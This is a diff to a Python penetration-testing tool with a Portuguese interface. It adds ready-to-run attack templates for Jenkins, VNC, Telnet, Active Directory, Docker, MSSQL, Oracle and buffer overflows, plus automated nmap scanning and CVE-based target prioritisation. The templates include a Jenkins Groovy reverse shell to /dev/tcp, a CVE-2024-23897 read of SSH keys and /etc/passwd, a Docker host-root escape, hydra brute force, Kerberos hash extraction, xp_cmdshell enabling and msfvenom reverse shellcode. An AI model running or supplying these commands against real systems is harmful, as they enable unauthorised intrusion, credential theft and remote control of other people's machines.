+                "followup": {"success": ["jenkins_groovy"], "fail": ["jenkins_brute"]},
+                "hints": "Se retornar JSON sem erro — tens acesso anónimo.\nNavega para {url}/script para o Groovy console"
+            },
+            {
+                "name": "Jenkins — RCE via Groovy Script Console",
+                "desc": "Executar código Groovy arbitrário (requer acesso admin)",
+                "params": [
+                    {"key": "url",   "label": "URL Jenkins",      "default": "http://{TARGET}:8080"},
+                    {"key": "lhost", "label": "Teu IP",           "default": ""},
+                    {"key": "lport", "label": "Porta listener",   "default": "4444"},
+                ],
+                "cmd": "curl -s -X POST '{url}/scriptText' --data-urlencode 'script=def cmd=[\"bash\",\"-c\",\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"].execute()'",
+                "followup": {"success": ["privesc_tree"], "fail": []},
+                "hints": "Também podes ir manualmente a /script e colar:\nThread.start {{ [\'bash\',\'-c\',\'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\'].execute() }}"
+            },
+            {
+                "name": "Jenkins — brute force login",
+                "desc": "Força bruta ao painel Jenkins",
+                "params": [
+                    {"key": "alvo",     "label": "IP alvo",    "default": "{TARGET}"},
+                    {"key": "user",     "label": "Utilizador", "default": "admin"},
+                    {"key": "wordlist", "label": "Wordlist",   "default": "/usr/share/wordlists/rockyou.txt"},
+                ],
+                "cmd": "hydra -l {user} -P {wordlist} -s 8080 http-post-form '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username' {alvo}",
+                "followup": {"success": ["jenkins_groovy"], "fail": []},
+                "hints": "Users comuns: admin, jenkins, administrator, root"
+            },
+            {
+                "name": "Jenkins CVE-2024-23897 — LFI/RCE",
+                "desc": "Leitura de ficheiros sem autenticação — Jenkins < 2.441",
+                "params": [
+                    {"key": "url",      "label": "URL Jenkins",           "default": "http://{TARGET}:8080"},
+                    {"key": "ficheiro", "label": "Ficheiro a ler",        "default": "/etc/passwd"},
+                ],
+                "cmd": "curl -s '{url}/cli?remoting=false' -H 'Session: x' -H 'Side-Channel-Command: 1' --data-binary '@{ficheiro}'",
+                "followup": {"success": ["jenkins_groovy"], "fail": []},
+                "hints": "CVE crítico de 2024. Tenta ler /etc/passwd, /root/.ssh/id_rsa, secrets do Jenkins"
+            },
+        ]
+    },
+
+    # ── VNC ───────────────────────────────────────────────────
+    "vnc": {
+        "label": "VNC",
+        "color": "cyan",
+        "icon": "🖥️",
+        "detect": lambda ports, banners: any(p in ports for p in ["5900","5901","5902","5903"]) or "vnc" in banners,
+        "attacks": [
+            {
+                "name": "VNC — acesso sem password",
+                "desc": "Tentar ligar ao VNC sem autenticação",
+                "params": [{"key": "alvo", "label": "IP alvo", "default": "{TARGET}"}],
+                "cmd": "vncviewer {alvo}:5900",
+                "followup": {"success": ["privesc_tree"], "fail": ["vnc_brute"]},
+                "hints": "Se pedir password tenta: (vazio), password, admin, 1234, root\nAlternativa headless: xdotool"
+            },
+            {
+                "name": "VNC — brute force (hydra)",
+                "desc": "Força bruta à password VNC",
+                "params": [
+                    {"key": "alvo",     "label": "IP alvo",    "default": "{TARGET}"},
+                    {"key": "wordlist", "label": "Wordlist",   "default": "/usr/share/wordlists/rockyou.txt"},
+                ],
+                "cmd": "hydra -P {wordlist} vnc://{alvo}",
+                "followup": {"success": ["vnc_connect"], "fail": []},
+                "hints": "VNC usa só password, sem username.\nTambém: ncrack -p 5900 --passwords rockyou.txt {alvo}"
+            },
+            {
+                "name": "VNC — nmap enum",
+                "desc": "Detectar versão e autenticação VNC",
+                "params": [{"key": "alvo", "label": "IP alvo", "default": "{TARGET}"}],
+                "cmd": "nmap -p 5900-5910 --script vnc-info,vnc-brute {alvo}",
+                "followup": {"success": ["vnc_connect"], "fail": []},
+                "hints": "Procura: VNC Authentication None — acesso directo sem password"
+            },
+        ]
+    },
+
+    # ── Telnet ────────────────────────────────────────────────
+    "telnet": {
+        "label": "Telnet",
+        "color": "yellow",
+        "icon": "📟",
+        "detect": lambda ports, banners: "23" in ports or "telnet" in banners,
+        "attacks": [
+            {
+                "name": "Telnet — ligar e testar credenciais padrão",
+                "desc": "Acesso interactivo via Telnet",
+                "params": [{"key": "alvo", "label": "IP alvo", "default": "{TARGET}"}],
+                "cmd": "telnet {alvo}",
+                "followup": {"success": ["privesc_tree"], "fail": ["telnet_brute"]},
+                "hints": "Credenciais padrão: admin:admin, root:root, admin:(vazio), guest:guest"
+            },
+            {
+                "name": "Telnet — brute force (hydra)",
+                "desc": "Força bruta às credenciais Telnet",
+                "params": [
+                    {"key": "alvo",     "label": "IP alvo",    "default": "{TARGET}"},
+                    {"key": "user",     "label": "Utilizador", "default": "admin"},
+                    {"key": "wordlist", "label": "Wordlist",   "default": "/usr/share/wordlists/rockyou.txt"},
+                ],
+                "cmd": "hydra -l {user} -P {wordlist} telnet://{alvo}",
+                "followup": {"success": ["privesc_tree"], "fail": []},
+                "hints": "Telnet transmite tudo em claro — captura com tcpdump se estiveres na mesma rede"
+            },
+        ]
+    },
+
+    # ── LDAP / Active Directory ───────────────────────────────
+    "ldap": {
+        "label": "LDAP / Active Directory",
+        "color": "bright_blue",
+        "icon": "🏢",
+        "detect": lambda ports, banners: any(p in ports for p in ["389","636","3268","3269","88"]) or
+            any(s in banners for s in ["ldap","active directory","kerberos","domain"]),
+        "attacks": [
+            {
+                "name": "LDAP — enumeração anónima",
+                "desc": "Extrair informação AD sem credenciais",
+                "params": [
+                    {"key": "alvo",   "label": "IP alvo",           "default": "{TARGET}"},
+                    {"key": "domain", "label": "Domínio (ex: htb.local)", "default": ""},
+                ],
+                "cmd": "ldapsearch -x -H ldap://{alvo} -b 'dc={domain}' '(objectClass=*)' 2>/dev/null | head -100",
+                "followup": {"success": ["ldap_users", "bloodhound"], "fail": ["ldap_brute"]},
+                "hints": "Domínio htb.local → -b 'dc=htb,dc=local'\nProcura: utilizadores, grupos, descrições com passwords"
+            },
+            {
+                "name": "ldapdomaindump — dump completo AD",
+                "desc": "Extrair todos os objectos AD para HTML/JSON",
+                "params": [
+                    {"key": "alvo",   "label": "IP alvo",       "default": "{TARGET}"},
+                    {"key": "domain", "label": "Domínio\\user", "default": ""},
+                    {"key": "pass_",  "label": "Password",      "default": ""},
+                    {"key": "output", "label": "Pasta output",  "default": "./ldap_dump"},
+                ],
+                "cmd": "ldapdomaindump -u '{domain}' -p '{pass_}' {alvo} -o {output}",
+                "followup": {"success": ["bloodhound"], "fail": []},
+                "hints": "Gera ficheiros HTML navegáveis com todos os users, grupos e GPOs"
+            },
+            {
+                "name": "BloodHound — mapeamento AD",
+                "desc": "Mapear caminhos de escalada no Active Directory",
+                "params": [
+                    {"key": "domain", "label": "Domínio",      "default": ""},
+                    {"key": "user",   "label": "Utilizador",   "default": ""},
+                    {"key": "pass_",  "label": "Password",     "default": ""},
+                    {"key": "alvo",   "label": "IP DC",        "default": "{TARGET}"},
+                ],
+                "cmd": "bloodhound-python -d {domain} -u {user} -p {pass_} -ns {alvo} -c all",
+                "followup": {"success": [], "fail": []},
+                "hints": "Importa os ficheiros .json gerados para o BloodHound GUI\nProcura: Shortest Paths to Domain Admins"
+            },
+            {
+                "name": "AS-REP Roasting",
+                "desc": "Extrair hashes de contas sem pre-autenticação Kerberos",
+                "params": [
+                    {"key": "domain", "label": "Domínio",      "default": ""},
+                    {"key": "alvo",   "label": "IP DC",        "default": "{TARGET}"},
+                    {"key": "output", "label": "Ficheiro output","default": "asrep.txt"},
+                ],
+                "cmd": "impacket-GetNPUsers {domain}/ -dc-ip {alvo} -no-pass -usersfile /usr/share/wordlists/seclists/Usernames/Names/names.txt -outputfile {output}",
+                "followup": {"success": ["crack_kerberos"], "fail": ["kerberoasting"]},
+                "hints": "Crackear os hashes:\nhashcat -m 18200 {output} /usr/share/wordlists/rockyou.txt"
+            },
+        ]
+    },
+
+    # ── Docker ────────────────────────────────────────────────
+    "docker": {
+        "label": "Docker",
+        "color": "bright_blue",
+        "icon": "🐳",
+        "detect": lambda ports, banners: any(p in ports for p in ["2375","2376","2377"]) or "docker" in banners,
+        "attacks": [
+            {
+                "name": "Docker API — acesso sem TLS",
+                "desc": "Ligar ao Docker daemon exposto sem autenticação",
+                "params": [{"key": "alvo", "label": "IP alvo", "default": "{TARGET}"}],
+                "cmd": "docker -H tcp://{alvo}:2375 ps && docker -H tcp://{alvo}:2375 images",
+                "followup": {"success": ["docker_escape"], "fail": []},
+                "hints": "Se listar containers — tens controlo total do Docker daemon"
+            },
+            {
+                "name": "Docker — escape para root do host",
+                "desc": "Montar filesystem do host via container privilegiado",
+                "params": [{"key": "alvo", "label": "IP alvo", "default": "{TARGET}"}],
+                "cmd": "docker -H tcp://{alvo}:2375 run -it --rm -v /:/mnt alpine chroot /mnt sh",
+                "followup": {"success": ["privesc_tree"], "fail": []},
+                "hints": "Este comando monta / do host dentro do container — tens acesso root total ao sistema"
+            },
+            {
+                "name": "Docker — escape via socket local",
+                "desc": "Escape de container via /var/run/docker.sock",
+                "params": [],
+                "cmd": "ls -la /var/run/docker.sock && docker run -it --rm -v /:/mnt alpine chroot /mnt sh",
+                "followup": {"success": ["privesc_tree"], "fail": []},
+                "hints": "Se o socket existir e for writable — és root no host\nVerifica com: find / -name docker.sock 2>/dev/null"
+            },
+        ]
+    },
+
+    # ── MSSQL ─────────────────────────────────────────────────
+    "mssql": {
+        "label": "MSSQL (SQL Server)",
+        "color": "bright_red",
+        "icon": "🗃️",
+        "detect": lambda ports, banners: "1433" in ports or "mssql" in banners or "sql server" in banners,
+        "attacks": [
+            {
+                "name": "MSSQL — login SA sem password",
+                "desc": "Tentar acesso com conta SA padrão",
+                "params": [{"key": "alvo", "label": "IP alvo", "default": "{TARGET}"}],
+                "cmd": "impacket-mssqlclient sa@{alvo} -windows-auth",
+                "followup": {"success": ["mssql_xpcmdshell"], "fail": ["mssql_brute"]},
+                "hints": "Tenta também: sa:(vazio), sa:sa, sa:password, sa:admin"
+            },
+            {
+                "name": "MSSQL — RCE via xp_cmdshell",
+                "desc": "Executar comandos OS via xp_cmdshell",
+                "params": [
+                    {"key": "alvo", "label": "IP alvo",    "default": "{TARGET}"},
+                    {"key": "user", "label": "Utilizador", "default": "sa"},
+                    {"key": "pass_","label": "Password",   "default": ""},
+                ],
+                "cmd": "impacket-mssqlclient {user}:{pass_}@{alvo} -windows-auth",
+                "followup": {"success": ["privesc_tree"], "fail": []},
+                "hints": "Após login:\nEXEC sp_configure 'show advanced options',1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';"
+            },
+            {
+                "name": "MSSQL — brute force (hydra)",
+                "desc": "Força bruta às credenciais MSSQL",
+                "params": [
+                    {"key": "alvo",     "label": "IP alvo",    "default": "{TARGET}"},
+                    {"key": "user",     "label": "Utilizador", "default": "sa"},
+                    {"key": "wordlist", "label": "Wordlist",   "default": "/usr/share/wordlists/rockyou.txt"},
+                ],
+                "cmd": "hydra -l {user} -P {wordlist} mssql://{alvo}",
+                "followup": {"success": ["mssql_xpcmdshell"], "fail": []},
+                "hints": "Também: msfconsole → use auxiliary/scanner/mssql/mssql_login"
+            },
+        ]
+    },
+
+    # ── Oracle DB ─────────────────────────────────────────────
+    "oracle": {
+        "label": "Oracle DB",
+        "color": "red",
+        "icon": "🔮",
+        "detect": lambda ports, banners: "1521" in ports or "oracle" in banners or "tnslsnr" in banners,
+        "attacks": [
+            {
+                "name": "Oracle — enumerar SID",
+                "desc": "Descobrir o SID (nome da base de dados Oracle)",
+                "params": [{"key": "alvo", "label": "IP alvo", "default": "{TARGET}"}],
+                "cmd": "msfconsole -q -x 'use auxiliary/scanner/oracle/sid_enum; set RHOSTS {alvo}; run'",
+                "followup": {"success": ["oracle_brute"], "fail": []},
+                "hints": "SIDs comuns: ORCL, XE, PROD, TEST, DB, ORACLE\nTambém: tnscmd10g version -h {alvo}"
+            },
+            {
+                "name": "Oracle — brute force credenciais",
+                "desc": "Força bruta com SID encontrado",
+                "params": [
+                    {"key": "alvo", "label": "IP alvo",  "default": "{TARGET}"},
+                    {"key": "sid",  "label": "SID",      "default": "ORCL"},
+                ],
+                "cmd": "msfconsole -q -x 'use auxiliary/scanner/oracle/oracle_login; set RHOSTS {alvo}; set SID {sid}; run'",
+                "followup": {"success": ["oracle_rce"], "fail": []},
+                "hints": "Credenciais padrão: sys:change_on_install, system:manager, scott:tiger, dbsnmp:dbsnmp"
+            },
+            {
+                "name": "Oracle — RCE via ODAT",
+                "desc": "Execução de comandos via Oracle Database Attack Tool",
+                "params": [
+                    {"key": "alvo", "label": "IP alvo",    "default": "{TARGET}"},
+                    {"key": "sid",  "label": "SID",        "default": "ORCL"},
+                    {"key": "user", "label": "Utilizador", "default": "scott"},
+                    {"key": "pass_","label": "Password",   "default": "tiger"},
+                ],
+                "cmd": "odat all -s {alvo} -d {sid} -U {user} -P {pass_}",
+                "followup": {"success": ["privesc_tree"], "fail": []},
+                "hints": "ODAT testa automaticamente: upload, exec, privesc, passwords\nInstalar: pip install odat"
+            },
+        ]
+    },
+
+    # ── Buffer Overflow ───────────────────────────────────────
+    "bof": {
+        "label": "Buffer Overflow",
+        "color": "bright_red",
+        "icon": "💣",
+        "detect": lambda ports, banners: False,  # activado manualmente
+        "attacks": [
+            {
+                "name": "Fuzzing — encontrar offset do crash",
+                "desc": "Enviar payload crescente até crashar o serviço",
+                "params": [
+                    {"key": "alvo",  "label": "IP alvo",      "default": "{TARGET}"},
+                    {"key": "porto", "label": "Porto serviço", "default": ""},
+                ],
+                "cmd": "python3 fuzzer.py  # Ver hints para o script",
+                "followup": {"success": ["bof_pattern"], "fail": []},
+                "hints": "Começa com 100, depois 500, 1000, 2000, 5000 bytes\nUsa Immunity Debugger + Mona no Windows para ver EIP"
+            },
+            {
+                "name": "Pattern Create — encontrar offset exacto",
+                "desc": "Gerar padrão único para identificar offset do EIP",
+                "params": [
+                    {"key": "tamanho", "label": "Tamanho do padrão (usa valor do crash)", "default": "3000"},
+                ],
+                "cmd": "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {tamanho}",
+                "followup": {"success": ["bof_offset"], "fail": []},
+                "hints": "Envia o padrão, regista o valor em EIP, depois usa pattern_offset"
+            },
+            {
+                "name": "Pattern Offset — calcular offset",
+                "desc": "Calcular offset exacto a partir do valor em EIP",
+                "params": [
+                    {"key": "eip",    "label": "Valor de EIP (ex: 41326241)", "default": ""},
+                    {"key": "tamanho","label": "Tamanho do padrão",           "default": "3000"},
+                ],
+                "cmd": "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l {tamanho} -q {eip}",
+                "followup": {"success": ["bof_badchars"], "fail": []},
+                "hints": "O offset diz-te quantos bytes antes de sobrescrever EIP"
+            },
+            {
+                "name": "Bad chars — identificar caracteres proibidos",
+                "desc": "Encontrar bytes que o serviço filtra/corrompe",
+                "params": [
+                    {"key": "alvo",   "label": "IP alvo",      "default": "{TARGET}"},
+                    {"key": "porto",  "label": "Porto serviço", "default": ""},
+                    {"key": "offset", "label": "Offset calculado", "default": ""},
+                ],
+                "cmd": "python3 badchars.py  # Ver hints para criar o script",
+                "followup": {"success": ["bof_jmp_esp"], "fail": []},
+                "hints": "Compara o dump de memória com os bytes enviados\n\x00 é quase sempre bad char"
+            },
+            {
+                "name": "Gerar shellcode com msfvenom",
+                "desc": "Criar shellcode sem os bad chars identificados",
+                "params": [
+                    {"key": "lhost",    "label": "Teu IP",          "default": ""},
+                    {"key": "lport",    "label": "Porta listener",  "default": "4444"},
+                    {"key": "badchars", "label": "Bad chars (ex: \\x00\\x0a)", "default": "\\x00"},
+                    {"key": "platform", "label": "Plataforma (windows/linux)", "default": "windows"},
+                ],
+                "cmd": "msfvenom -p {platform}/shell_reverse_tcp LHOST={lhost} LPORT={lport} -b '{badchars}' -f python -v shellcode",
+                "followup": {"success": ["bof_exploit"], "fail": []},
+                "hints": "Adiciona NOP sled antes do shellcode: b'\\x90'*16 + shellcode"
+            },
+        ]
+    },
     # ── Cracking de Hashes ───────────────────────────────────
     "hashes": {
         "label": "Cracking de Hashes",
@@ -1723,22 +2677,106 @@ ATTACK_TREE = {
 #  FUNÇÕES DO MOTOR DE INTELIGÊNCIA
 # ═══════════════════════════════════════════════════════════
 
+# ── Base de CVEs / prioridade por versão ────────────────────
+CVE_SIGNATURES = [
+    # (regex_para_banner, vector_key, prioridade, cve, descricao_curta)
+    (r"vsftpd 2\.3\.4",               "ftp",       1, "CVE-2011-2523",  "Backdoor directo — shell root sem auth"),
+    (r"proftpd 1\.3\.5",              "ftp",       1, "CVE-2015-3306",  "mod_copy RCE sem autenticação"),
+    (r"openssh 7\.([0-6])",            "ssh",       3, "CVE-2016-6210",  "User enumeration via timing attack"),
+    (r"openssh 2\.([0-9])",            "ssh",       2, "CVE-2001-0572",  "Versão muito antiga — múltiplos exploits"),
+    (r"apache[/ ]2\.4\.4[89]",        "apache",    1, "CVE-2021-41773", "Path Traversal RCE sem autenticação"),
+    (r"apache[/ ]2\.4\.50",           "apache",    1, "CVE-2021-42013", "Path Traversal RCE (bypass do fix anterior)"),
+    (r"apache[/ ]2\.2\.",             "apache",    2, "CVE-2017-7679",  "Buffer overflow — versão muito antiga"),
+    (r"apache tomcat[/ ]([0-9\.]+)",   "apache",    2, "CVE-2020-1938",  "Ghostcat — LFI via AJP porto 8009"),
+    (r"iis[/ ]([0-9]+)",                "http",      3, "CVE-2017-7269",  "WebDAV buffer overflow (IIS 6.0)"),
+    (r"php[/ ]([5-7])\.([0-6])",       "http",      2, "CVE-varies",     "Versão PHP desactualizada — múltiplos CVEs"),
+    (r"wordpress",                       "wordpress", 2, "CVE-varies",     "WordPress detectado — enumerar plugins/users"),
+    (r"drupal",                          "drupal",    1, "CVE-2018-7600",  "Drupalgeddon2 — RCE sem autenticação"),
+    (r"joomla",                          "http",      2, "CVE-varies",     "Joomla detectado — verificar versão"),
+    (r"samba[/ ]([0-9]+)",              "smb",       2, "CVE-2017-7494",  "SambaCry — RCE via pipe"),
+    (r"windows.*smb|microsoft.*smb",    "smb",       1, "CVE-2017-0144",  "EternalBlue — verificar patch MS17-010"),
+    (r"microsoft rdp|ms-wbt-server",    "rdp",       2, "CVE-2019-0708",  "BlueKeep — verificar patch"),
+    (r"mysql[/ ]([0-9]+)",              "sql",       2, "CVE-varies",     "MySQL exposto — testar sem password"),
+    (r"microsoft sql server",           "mssql",     2, "CVE-varies",     "MSSQL exposto — testar SA sem password"),
+    (r"oracle",                          "oracle",    2, "CVE-varies",     "Oracle DB exposto — enumerar SID"),
+    (r"redis",                           "redis",     1, "CVE-2022-0543",  "Redis sem auth — RCE via Lua"),
+    (r"mongodb",                         "mongodb",   2, "CVE-varies",     "MongoDB — testar acesso sem auth"),
+    (r"jenkins",                         "jenkins",   1, "CVE-2024-23897", "Jenkins < 2.441 — LFI/RCE sem auth"),
+    (r"docker",                          "docker",    1, "CVE-varies",     "Docker API exposto — escape para host"),
+    (r"vnc",                             "vnc",       2, "CVE-varies",     "VNC exposto — testar sem password"),
+    (r"telnet",                          "telnet",    3, "CVE-varies",     "Telnet — credenciais em claro"),
+    (r"snmp",                            "snmp",      3, "CVE-varies",     "SNMP — community string padrão"),
+    (r"ldap|active.directory",           "ldap",      2, "CVE-varies",     "LDAP/AD — enumeração anónima"),
+    (r"nfs|rpcbind",                     "nfs",       2, "CVE-varies",     "NFS exposto — listar exports"),
+    (r"smtp|sendmail|postfix",           "mail",      3, "CVE-varies",     "SMTP — enumerar utilizadores"),
+    (r"log4j|log4shell",                 "apache",    1, "CVE-2021-44228", "Log4Shell — CVSS 10.0 RCE"),
+    (r"shellshock|bash 4\.[0-3]",      "apache",    1, "CVE-2014-6271",  "Shellshock — RCE via env vars"),
+    (r"heartbleed|openssl 1\.0\.[01]","apache",    1, "CVE-2014-0160",  "Heartbleed — leitura de memória SSL"),
+]
+
+PRIORITY_LABEL = {
+    1: ("[bold red]🔴 CRÍTICO[/bold red]",   "red"),
+    2: ("[bold yellow]🟠 ALTO[/bold yellow]", "yellow"),
+    3: ("[bold cyan]🟡 MÉDIO[/bold cyan]",   "cyan"),
+    4: ("[dim]🟢 BAIXO[/dim]",               "dim"),
+}
+
 def detect_vectors(scan_output, target):
-    """Analisa output do nmap e devolve vectores detectados."""
-    ports_found = re.findall(r'(\d+)/tcp\s+open', scan_output)
-    ports_found += re.findall(r'(\d+)/udp\s+open', scan_output)
+    """Analisa output do nmap — detecta vectores e atribui prioridade por CVE/versão."""
+    ports_found = re.findall(r"(\d+)/tcp\s+open", scan_output)
+    ports_found += re.findall(r"(\d+)/udp\s+open", scan_output)
     banners = scan_output.lower()
 
-    detected = []
+    # Detectar vectores base
+    detected_keys = set()
     for key, vector in ATTACK_TREE.items():
-        if key in ("privesc", "hashes"):
+        if key in ("privesc", "hashes", "bof"):
             continue
         try:
             if vector["detect"](ports_found, banners):
-                detected.append(key)
+                detected_keys.add(key)
         except Exception:
             pass
-    return detected, ports_found
+
+    # Enriquecer com CVEs e prioridade
+    enriched = {}   # key -> {priority, cves: [{cve, desc}], services: [str]}
+
+    # Primeiro passa — prioridade base por detecção de porto
+    for key in detected_keys:
+        enriched[key] = {"priority": 4, "cves": [], "services": [], "recommended": False}
+
+    # Segundo passa — cruzar banners com assinaturas CVE
+    for pattern, vkey, priority, cve, desc in CVE_SIGNATURES:
+        if re.search(pattern, banners, re.IGNORECASE):
+            if vkey not in enriched:
+                enriched[vkey] = {"priority": 4, "cves": [], "services": [], "recommended": False}
+                detected_keys.add(vkey)
+            if priority < enriched[vkey]["priority"]:
+                enriched[vkey]["priority"] = priority
+            if cve not in [c["cve"] for c in enriched[vkey]["cves"]]:
+                enriched[vkey]["cves"].append({"cve": cve, "desc": desc})
+
+    # Extrair serviços do output nmap
+    service_lines = re.findall(r"(\d+)/tcp\s+open\s+(\S+)\s*(.*)", scan_output)
+    for port, svc, version in service_lines:
+        for key in enriched:
+            v = ATTACK_TREE.get(key, {})
+            try:
+                if v.get("detect") and v["detect"]([port], (svc + " " + version).lower()):
+                    entry = f"{port}/tcp {svc} {version}".strip()
+                    if entry not in enriched[key]["services"]:
+                        enriched[key]["services"].append(entry)
+            except Exception:
+                pass
+
+    # Ordenar por prioridade
+    sorted_keys = sorted(enriched.keys(), key=lambda k: enriched[k]["priority"])
+
+    # Marcar o mais recomendado
+    if sorted_keys:
+        enriched[sorted_keys[0]]["recommended"] = True
+
+    return sorted_keys, ports_found, enriched
 
 def intelligence_menu(project, save_fn, color="red"):
     """Menu principal do motor de inteligência."""
@@ -1755,14 +2793,15 @@ def intelligence_menu(project, save_fn, color="red"):
         ))
         console.print()
 
-        # Menu de entrada
         menu = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
         menu.add_column(style="bold cyan", width=6)
         menu.add_column()
-        menu.add_row("[1]", "Analisar output do nmap (detectar vectores automaticamente)")
-        menu.add_row("[2]", "Escolher vector manualmente")
-        menu.add_row("[3]", "Escalada de Privilégios (após acesso inicial)")
-        menu.add_row("[4]", "Cracking de Hashes")
+        menu.add_row("[1]", "Correr nmap agora — análise automática em tempo real")
+        menu.add_row("[2]", "Carregar scan anterior guardado")
+        menu.add_row("[3]", "Escolher vector manualmente")
+        menu.add_row("[4]", "Escalada de Privilégios (após acesso inicial)")
+        menu.add_row("[5]", "Cracking de Hashes")
+        menu.add_row("[6]", "Buffer Overflow")
         menu.add_row("[B]", "Voltar")
         console.print(menu)
         console.print()
@@ -1772,15 +2811,21 @@ def intelligence_menu(project, save_fn, color="red"):
         if ch == "B":
             break
         elif ch == "1":
-            scan_output = _get_scan_output(project)
+            scan_output = _run_nmap_live(project, save_fn)
             if scan_output:
                 _auto_detect_and_attack(scan_output, target, project, save_fn)
         elif ch == "2":
-            _manual_vector_menu(target, project, save_fn)
+            scan_output = _load_saved_scan(project)
+            if scan_output:
+                _auto_detect_and_attack(scan_output, target, project, save_fn)
         elif ch == "3":
-            _attack_vector_menu("privesc", target, project, save_fn)
+            _manual_vector_menu(target, project, save_fn)
         elif ch == "4":
+            _attack_vector_menu("privesc", target, project, save_fn)
+        elif ch == "5":
             _attack_vector_menu("hashes", target, project, save_fn)
+        elif ch == "6":
+            _attack_vector_menu("bof", target, project, save_fn)
 
 def _banner_intel():
     from rich.align import Align
@@ -1788,41 +2833,107 @@ def _banner_intel():
     console.print(Align.center(Text("[ REAPER — INTELLIGENCE ENGINE ]", style="bold red")))
     console.print(Rule(style="red"))
 
-def _get_scan_output(project):
-    """Pede ao utilizador para colar ou carregar output do nmap."""
+def _run_nmap_live(project, save_fn):
+    """Corre nmap em tempo real, mostra output e guarda automaticamente."""
+    target = project.get("target", "")
     console.print()
     console.print(Panel(
-        "[cyan]Cola aqui o output do nmap (ou caminho para ficheiro .txt)[/cyan]\n"
-        "[dim]Termina com uma linha que contenha apenas: FIM[/dim]",
+        f"[cyan]Scan nmap ao alvo:[/cyan] [bold yellow]{target}[/bold yellow]",
         border_style="cyan"
     ))
     console.print()
 
-    opt = Prompt.ask("[cyan]Opção[/cyan]\n  [1] Colar output directamente\n  [2] Carregar de ficheiro\n  [B] Cancelar\n\nEscolha").strip().upper()
+    # Escolher tipo de scan
+    t = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
+    t.add_column(style="bold cyan", width=6); t.add_column()
+    t.add_row("[1]", "Rápido  — Top 1000 portos  (nmap -sV -sC)")
+    t.add_row("[2]", "Completo — Todos os portos  (nmap -sV -sC -p-)")
+    t.add_row("[3]", "Agressivo — Completo + scripts vuln  (nmap -A -p-)")
+    t.add_row("[4]", "UDP — Top 100 UDP  (nmap -sU --top-ports 100)")
+    t.add_row("[B]", "Cancelar")
+    console.print(t)
 
-    if opt == "B":
+    ch = Prompt.ask("[cyan]Tipo de scan[/cyan]").strip().upper()
+    if ch == "B":
         return None
-    elif opt == "2":
-        path = Prompt.ask("[cyan]Caminho do ficheiro[/cyan]").strip()
-        try:
-            with open(path) as f:
-                return f.read()
-        except Exception as e:
-            console.print(f"[red]Erro ao ler ficheiro: {e}[/red]")
-            return None
-    else:
-        lines = []
-        console.print("[dim]Cola o output e escreve FIM numa linha vazia para terminar:[/dim]")
-        while True:
-            line = input()
-            if line.strip().upper() == "FIM":
-                break
-            lines.append(line)
-        return "\n".join(lines)
+
+    scan_cmds = {
+        "1": f"nmap -sV -sC -T4 {target}",
+        "2": f"nmap -sV -sC -p- -T4 {target}",
+        "3": f"nmap -A -p- -T4 {target}",
+        "4": f"nmap -sU --top-ports 100 -T4 {target}",
+    }
+    cmd = scan_cmds.get(ch, scan_cmds["1"])
+
+    # Ficheiro de output automático
+    import datetime as _dt
+    safe_target = target.replace(".", "_").replace("/", "_")
+    ts = _dt.datetime.now().strftime("%Y%m%d_%H%M%S")
+    outfile = f"nmap_{safe_target}_{ts}.txt"
+
+    full_cmd = cmd + f" -oN {outfile}"
+
+    console.print(f"\n[yellow]A correr:[/yellow] [bold green]{full_cmd}[/bold green]")
+    console.print(f"[dim]Output guardado em: {outfile}[/dim]\n")
+    console.print(Rule(style="dim green"))
+
+    output_lines = []
+    try:
+        proc = subprocess.Popen(
+            full_cmd, shell=True,
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+            text=True, bufsize=1
+        )
+        for line in proc.stdout:
+            print(line, end="", flush=True)
+            output_lines.append(line)
+        proc.wait()
+    except KeyboardInterrupt:
+        console.print("\n[yellow]Scan interrompido.[/yellow]")
+
+    console.print(Rule(style="dim green"))
+    scan_output = "".join(output_lines)
+
+    # Guardar referência no projecto
+    project["phases"]["2"]["notas"] = (
+        project["phases"]["2"].get("notas", "") +
+        f"\n[nmap] {full_cmd} → {outfile}"
+    ).strip()
+    save_fn()
+
+    console.print(f"\n[green]✔ Scan concluído — guardado em {outfile}[/green]")
+    _pause()
+    return scan_output
+
+
+def _load_saved_scan(project):
+    """Carrega scan nmap anteriormente guardado."""
+    from pathlib import Path as _Path
+    scans = list(_Path(".").glob("nmap_*.txt"))
+    if not scans:
+        console.print("[yellow]Nenhum scan guardado encontrado nesta directoria.[/yellow]")
+        _pause()
+        return None
+
+    t = Table(box=box.SIMPLE_HEAD, border_style="dim")
+    t.add_column("#", style="bold cyan", width=4)
+    t.add_column("Ficheiro")
+    t.add_column("Modificado", style="dim")
+    for i, f in enumerate(scans, 1):
+        import datetime as _dt
+        mtime = _dt.datetime.fromtimestamp(f.stat().st_mtime).strftime("%Y-%m-%d %H:%M")
+        t.add_row(str(i), f.name, mtime)
+
+    console.print(t)
+    ch = Prompt.ask("[cyan]Número (ENTER para cancelar)[/cyan]", default="").strip()
+    if ch.isdigit() and 1 <= int(ch) <= len(scans):
+        with open(scans[int(ch)-1]) as f:
+            return f.read()
+    return None
 
 def _auto_detect_and_attack(scan_output, target, project, save_fn):
-    """Detecta vectores no output e apresenta menu de ataque."""
-    detected, ports = detect_vectors(scan_output, target)
+    """Detecta vectores, enriquece com CVEs e apresenta por prioridade."""
+    detected, ports, enriched = detect_vectors(scan_output, target)
 
     console.clear()
     _banner_intel()
@@ -1836,24 +2947,66 @@ def _auto_detect_and_attack(scan_output, target, project, save_fn):
         _pause()
         return
 
-    console.print(Panel(
-        f"[green]Vectores detectados:[/green] [bold]{len(detected)}[/bold]  |  "
-        f"[green]Portos abertos:[/green] {', '.join(ports[:10])}",
-        border_style="green"
-    ))
-    console.print()
+    # Guardar vectores detectados no projecto
+    project["phases"]["2"]["servicos"] = ", ".join(
+        ATTACK_TREE[k]["label"] for k in detected
+    )
+    save_fn()
 
-    t = Table(box=box.ROUNDED, border_style="red", header_style="bold red", show_lines=True)
-    t.add_column("#",       style="bold cyan",  width=4,  justify="center")
-    t.add_column("Vector",  style="bold white", width=20)
-    t.add_column("Serviço", style="dim white",  width=40)
+    def _build_table():
